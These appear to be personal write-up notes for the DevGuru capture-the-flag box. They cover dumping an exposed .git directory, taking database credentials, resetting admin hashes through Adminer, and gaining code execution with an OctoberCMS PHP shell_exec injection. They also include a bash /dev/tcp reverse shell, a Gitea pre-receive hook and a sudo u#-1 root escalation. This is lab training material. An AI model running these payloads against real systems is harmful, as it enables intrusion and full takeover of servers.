
Skills:

- Web Enumeration
- Extracting the contents of .git directory - GitDumper
- Extracting the contents of .git directory - GitExtractor
- Information Leakage
- Gaining access to a Adminer 4.7.7 panel
- Generating a new bcrypt hash for a user in order to gain access to OctoberCMS backend
- OctoberCMS Exploitation - Markup + PHP Code Injection
- Abusing Adminer to gain access to Gitea
- Abusing Git Hooks (pre-receive) - Code Execution (User Pivoting)
- Abusing sudoers privilege (ALL, !root) NOPASSWD + Sudo version (u#-1) in order to become root
-


```
whatweb ip  --> October_session --> cmd october
```
add to hosts file --> devguru.local

```
nmap -p 80 --script http-git ip port 80 http --> /.git/
```

OctoberCmd admin panel
```
http://192.168.0.104/backend
```

On port 8585 --> Gitea

Focus in .git using git-dumper https://github.com/internetwache/GitTools

```
#clone the dumper and extraactor repository
>svn checkout https://github.com/internetwache/GitTools/trunk/Dumper
>svn checkout https://github.com/internetwache/GitTools/trunk/Extractor
>cd dumper
>./gitdumper.sh http://192.168.0.104/.git/ ../git-project
>cd ../git-project
>cd ..
>cd Extractor
>./extractor.sh ../project ../full-git-project
>cd ../full-git-project
>cd config
>cat database.php --> found credentials!
```

Use the found credentials on the adminer.php page

```
http://192.168.0.104/adminer
>username -> october
>password -> 
>database -> octoberdb
```

I can edit the password for the frank user and use this credentials to logging into OctoberCmd admin panel
```
https://bcrypt-generator.com --> Encrypt the new password
```

Now inside the backend site try to inject a malicious php code to be able to remote code execution
```
#code
function onStart()
{
	$this>page["cmd"] = shell_exec($_GET['cmd']);
}
#Markup
{{ this.page.cmd }}

#On site
http://192.168.0.105/?cmd=whomai
# get a reverse shell
#on my machine
nc -nlvp 1234
#on website
http://192.168.0.105/?cmd=bash -c "bash -i >%26/dev/tcp/192.168.0.100/1234 0>%261"
```

Escalating privilege
```
> id --> nothing
> sudo -l --> nothing
> cd /var/backups
> cat app.ini.bak --> found credentials to the gitea db
> 
```

Whit these credentials I connect to the Adminer page

```
http://192.168.0.104/adminer
>username -> gitea
>password -> 
>database -> 
```

I can edit the password for the frank user and use this credentials to logging into Gitea application
```
https://bcrypt-generator.com --> Encrypt the new password
```

Command injection on the gitea application

```
#abuse githook
#githook pre receive
> bash -i >& /dev/tcp/192.168.0.100/1234 0>&1
#on my machine
nc -nlvp 1234
> make a commit and commit changes
```

Now we gain access as the user frank
Escalating privilege
```
> id --> nothing
> sudo -l --> You can execute the sqlite3 binary as any user except for root
> sudo --version --> 1.8.21 --> abusing sudo
> sudo -u#-1 sqlite3 /dev/null '.shell /bin/bash'
```

Now we gain access as the user root.